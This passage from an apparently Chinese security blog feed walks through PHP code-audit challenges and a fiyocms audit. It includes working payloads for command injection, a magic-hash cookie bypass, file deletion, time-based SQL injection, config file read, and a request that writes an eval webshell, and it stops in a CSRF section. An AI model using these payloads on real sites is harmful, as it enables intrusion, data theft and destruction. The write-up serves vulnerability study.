class="keyword">return</span> <span class="keyword">$this</span>-&gt;validIndices;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCommand</span><span class="params">($parameters)</span> </span>&#123;</span><br><span class="line">        $indices = <span class="keyword">$this</span>-&gt;indices($parameters);</span><br><span class="line">        $params = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($indices <span class="keyword">as</span> $index) &#123;</span><br><span class="line">            $params[] = $parameters[$index];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> implode($params, <span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = (<span class="keyword">new</span> ParamExtractor())-&gt;getCommand($_GET[<span class="string">'p'</span>]);</span><br><span class="line">system(<span class="string">'resizeImg image.png '</span> . $cmd);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这道题需要运行在<strong>php7</strong>的环境，开头的<code>declare(strict_types=1);</code>就是php7的一种新引入方式，作用是在函数调用时会对参数进行类型检查，举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addnum</span><span class="params">(int $a,int $b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> addnum(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">//输出3</span></span><br><span class="line"><span class="keyword">echo</span> addnum(<span class="string">'1'</span>,<span class="string">'2'</span>); <span class="comment">//Fatal error: Uncaught TypeError:的错误</span></span><br></pre></td></tr></table></figure><p>所以这就保证了最后通过<code>$validate</code>函数的<code>$value</code>都是数字且都大于0，但是这题漏洞在于<code>array_walk</code>这个函数，它不会对传入的参数做类型检查，也就是说它还是会按照php本身弱类型语言的特性对传入的参数做类型转化</p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addnum</span><span class="params">(int &amp;$value)</span> </span>&#123;</span><br><span class="line">    $value = $value+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$input = <span class="keyword">array</span>(<span class="string">'1a'</span>,<span class="string">'2b'</span>);</span><br><span class="line">array_walk($input,addnum);</span><br><span class="line">var_dump($input); <span class="comment">#array(2) &#123; [0]=&gt; int(2) [1]=&gt; int(3) &#125;</span></span><br></pre></td></tr></table></figure><p>所以，我们很容易就能够进行任意命令执行，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?p[1]=1;touch info.php</span><br><span class="line">?p[1]=1;echo &apos;&lt;?php phpinfo(); ?&gt;&apos; &gt;&gt; info.php</span><br></pre></td></tr></table></figure><p>这样就能向当前目录写入webshell</p><h2 id="Day22"><a href="#Day22" class="headerlink" title="Day22"></a>Day22</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">'hash'</span>, md5($_POST[<span class="string">'password'</span>]));</span><br><span class="line">    header(<span class="string">"Refresh: 0"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$password = <span class="string">'0e836584205638841937695747769655'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form&gt;&lt;input type="password" name="password" /&gt;'</span></span><br><span class="line">       . <span class="string">'&lt;input type="submit" value="Login" &gt;&lt;/form &gt;'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (md5($_COOKIE[<span class="string">'hash'</span>]) == $password) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login succeeded'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题考察的就是PHP会将<code>0e</code>开头的值以科学计数法进行处理，例如<code>0e123 == 0e321</code></p><p>这里<code>cookie</code>字段我们是可控的，所以我们只需要找到一个经过md5加密后开头是0e的值即可</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: hash=QNKCDZO</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--fiyocms</title>
    <link href="https://Foxgrin.github.io//posts/42478/"/>
    <id>https://Foxgrin.github.io//posts/42478/</id>
    <published>2019-03-01T07:07:00.000Z</published>
    <updated>2019-03-02T08:48:01.938Z</updated>
    
    <content type="html"><![CDATA[<p>记录fiyocms审计过程以及漏洞分析<a id="more"></a></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>该CMS的核心分析页面是在/dapur/index.php中，这是一个管理员的后台管理页面，首先需要以管理的身份进行登录，登录后，我们可以发现，访问其中很多具体管理页面，都是通过GET方式向服务器提交参数，如添加用户功能，提交的是app参数和act参数，那么我们在Seay审计系统中通过全局搜索功能搜索关键参数<strong>app</strong>,观察是哪个具体的文件接收了这个参数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出，/dapur/system/apps.php文件接收了<strong>app</strong>参数，于是跟进该文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($app))&#123;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">"apps/app_$app/app_$app.php"</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sysAdminApps</span><span class="params">()</span> </span>&#123;</span><br><span class="line">htmlRedirect(<span class="string">'../'</span>.siteConfig(<span class="string">'backend_folder'</span>));</span><br><span class="line"><span class="comment">/* blank line */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadAdminApps</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">/* blank line */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sysAdminApps</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$app=$_REQUEST[<span class="string">'app'</span>]; </span><br><span class="line">baseSystem($app);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadAdminApps</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$app=$_REQUEST[<span class="string">'app'</span>]; </span><br><span class="line">baseApps(<span class="string">"app_"</span>.$app);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当接收到app参数时，做出判断apps/app_$app/app_$app.php文件是否存在，如果存在定义两个方法：sysAdminApps()和loadAdminApps()，其中又调用了baseSystem()和baseApps()方法，我们继续搜索这两个方法的出处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baseApps</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">require</span> (<span class="string">"apps/$file/$file.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baseSystem</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">$file = <span class="string">"apps/app_$file/sys_$file.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以这两个方法发现包含了两个关键性文件，所以，管理界面每个功能都包含了两个关键文件，例如添加用户功能（$app=user），那么就有两个关键文件：apps/app_user/app_user.php和apps/app_user/sys_user.php需要我们去关注</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_config/controller/backuper.php 第16-30行</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'type'</span>] == <span class="string">'database'</span>) &#123;</span><br><span class="line">@unlink(<span class="string">"../../../../.backup/$_POST[file]"</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">'../../../../.backup'</span>))</span><br><span class="line">mkdir(<span class="string">'../../../../.backup'</span>);</span><br><span class="line">$date = md5(date(<span class="string">"Ymd:His"</span>));</span><br><span class="line">$file = <span class="string">"db-backup-$date"</span>;</span><br><span class="line">$c = backup_tables(<span class="string">"*"</span>,<span class="string">'../../../../.backup'</span>,<span class="string">"$file"</span>,<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span>($c) &#123;</span><br><span class="line">$size = format_size(filesize(<span class="string">"../../../../.backup/$file.sql"</span>));</span><br><span class="line">$time = date(<span class="string">"Y/m/d H:i:s"</span>,filemtime(<span class="string">"../../../../.backup/$file.sql"</span>));</span><br><span class="line">$r = <span class="string">"$size - $time"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123; \"file\":\"$file.sql\" , \"info\":\"$r\" &#125;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个文件存在非常多这个问题，通过POST传递的参数file没有经过任何处理就拼接进<strong>unlink</strong>函数进行文件删除操作</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>在网站根目录下建立demo.php文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>攻击payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /dapur/apps/app_config/controller/backuper.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 65</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Referer: http://127.0.0.1/dapur/index.php?app=config&amp;view=backup</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">type=database&amp;file=../demo.php</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>demo.php被删除</p><h3 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h3><h4 id="位置-1"><a href="#位置-1" class="headerlink" title="位置"></a>位置</h4><p>/system/database.php 第210-233行</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table,$rows,$where)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $update = <span class="string">'UPDATE '</span>.$table.<span class="string">' SET '</span>;</span><br><span class="line">    $keys = array_keys($rows);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($rows); $i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_string($rows[$keys[$i]]) <span class="keyword">AND</span> $rows[$keys[$i]] !== <span class="string">'+hits'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $update .= $keys[$i].<span class="string">'="'</span>.$rows[$keys[$i]].<span class="string">'"'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="keyword">if</span>($rows[$keys[$i]] == <span class="string">'+hits'</span>) $rows[$keys[$i]] = $keys[$i] . <span class="string">'+'</span>. <span class="number">1</span>;</span><br><span class="line">             $update .= $keys[$i].<span class="string">'='</span>.$rows[$keys[$i]];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Parse to add commas</span></span><br><span class="line">        <span class="keyword">if</span>($i != count($rows)<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $update .= <span class="string">','</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $update .= <span class="string">' WHERE '</span>.$where;</span><br></pre></td></tr></table></figure><p>可以看到这里update语句中的where条件是通过直接拼接参数$where而成的，猜测可能通过$where参数构成sql注入，我们随便找一个带有update方法的实例，如/dapur/apps/app_user/controller.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'stat'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'stat'</span>]==<span class="string">'1'</span>)&#123;</span><br><span class="line">$db-&gt;update(FDBPrefix.<span class="string">'user'</span>,<span class="keyword">array</span>(<span class="string">"status"</span>=&gt;<span class="string">"1"</span>),<span class="string">'id='</span>.$_GET[<span class="string">'id'</span>]);</span><br><span class="line">alert(<span class="string">'success'</span>,Status_Applied,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过GET方式构造id参数构成SQL注入攻击</p><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /dapur/apps/app_user/controller/status.php?stat=1&amp;id=1%20and%20if(ascii(substr(database(),1,1))=102,sleep(3),1) HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功造成延时注入</p><p>当然，<strong>delete</strong>方法也同样存在这个问题，就不赘述了</p><h3 id="文件读取漏洞"><a href="#文件读取漏洞" class="headerlink" title="文件读取漏洞"></a>文件读取漏洞</h3><h4 id="位置-2"><a href="#位置-2" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_theme/libs/check_file.php 第13-26行</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$file = $url= <span class="string">"$_GET[src]/$_GET[name]"</span>; </span><br><span class="line">$furl = <span class="string">"../../../$url"</span>;</span><br><span class="line"></span><br><span class="line">$content = strlen(<span class="string">"$file"</span>) - <span class="number">5</span>;</span><br><span class="line">$content = substr(<span class="string">"$file"</span>,$content);</span><br><span class="line">$file = strpos(<span class="string">"$content"</span>,<span class="string">"."</span>);</span><br><span class="line">$file = substr(<span class="string">"$content"</span>,$file+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file == <span class="string">"html"</span> || $file == <span class="string">"htm"</span> || $file == <span class="string">"xhtml"</span> || $file == <span class="string">"js"</span> ||</span><br><span class="line">$file == <span class="string">"jsp"</span> || $file == <span class="string">"php"</span> || $file == <span class="string">"css"</span> || $file == <span class="string">"xml"</span> ) :</span><br><span class="line">$content = @file_get_contents($furl);</span><br><span class="line">$content = htmlentities($content);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计可知，当$file后缀名为指定文件后缀时，通过<strong>file_get_contents</strong>函数进行文件读取功能，而参数$furl是通过GET方式传入的参数src和name拼接而成的，这就构成了任意文件读取漏洞</p><h4 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h4><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /dapur/apps/app_theme/libs/check_file.php?src=..&amp;name=config.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>读取的是网站根目录下的config.php文件，结果如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="位置-3"><a href="#位置-3" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_theme/libs/save_file.php 第23-27行</p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$c = $_POST[<span class="string">"content"</span>];</span><br><span class="line">$f = $_POST[<span class="string">"src"</span>]; </span><br><span class="line">$w = file_put_contents($f,$c);</span><br></pre></td></tr></table></figure><p>显而易见没有过滤参数就拼接在<strong>file_put_contents</strong>函数中，构成文件上传漏洞</p><h4 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h4><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /dapur/apps/app_theme/libs/save_file.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">src=../../../../demo.php&amp;content=&lt;?php eval($_POST[&apos;cmd&apos;]); ?&gt;</span><br></pre></td></tr></table></figure><p>在网站根目录下上传一个文件名为demo.php的一句话木马文件，结果如下图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功上传一句话木马文件</p><h3 id="CSRF添加超级用户"><a href="#CSRF添加超级用户" class="headerlink" title="CSRF添加超级用户"></a>CSRF添加超级用户</h3><h4 id="位置-4"><a href="#位置-4" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_user/sys_user.php 第110-123行</p><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'save'</span>]) <span class="keyword">or</span> <span class="keyword">isset</span>($_POST[<span class="string">'apply'</span>]))&#123;</span><br><span class="line">$us=strlen(<span class="string">"$_POST[user]"</span>);</span><br><span class="line">$ps=strlen(<span class="string">"$_POST[password]"</span>);</span><br><span class="line">$user = $_POST[<span class="string">'user'</span>];</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">preg_match(<span class="string">'/[^a-zA-Z0-9]+/'</span>, $user, $matches);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>]) <span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>($_POST[<span class="string">'user'</span>])<span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>])<span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>])<span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>($_POST[<span class="string">'level'</span>])<span class="keyword">AND</span> </span><br><span class="line">$_POST[<span class="string">'password'</span>]==$_POST[<span class="string">'kpassword'</span>] <span class="keyword">AND</span> </span><br><span class="line">$us&gt;<span class="number">2</span> <span class="keyword">AND</span> $ps&gt;<span class="number">3</span> <span class="keyword">AND</span> @ereg(<span class="string">"^.+@.+\\..+$"</span>,$_POST[<span class="string">'email'</span>]) <span class="keyword">AND</span> !$matches) &#123;</span><br><span class="line">$qr=$db-&gt;insert(FDBPrefix.<span class="string">'user'</span>,<span class="keyword">array</span>(<span class="string">""</span>,<span class="string">"$user"</span>,<span class="string">"$name"</span>,MD5(<span class="string">"$_POST[password]"</span>),<span class="string">"$_POST[email]"</span>,<span class="string">"$_POST[status]"</span>,<span class="string">"$_POST[level]"</span>,date(<span class="string">'Y-m-d H:i:s'</span>),<span class="string">''</span>,<span class="string">"$_POST[bio]"</span>));</span><br></pre></td></tr></table></figure><p>这是一个添加用户的程序，但是没有加入token验证，所以可以造成CSRF攻击，添加超级用户</p><h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p>我们先抓取添加用户的包，确定需要提交的参数，抓包结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /dapur/?app=user&amp;act=add HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 124</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: 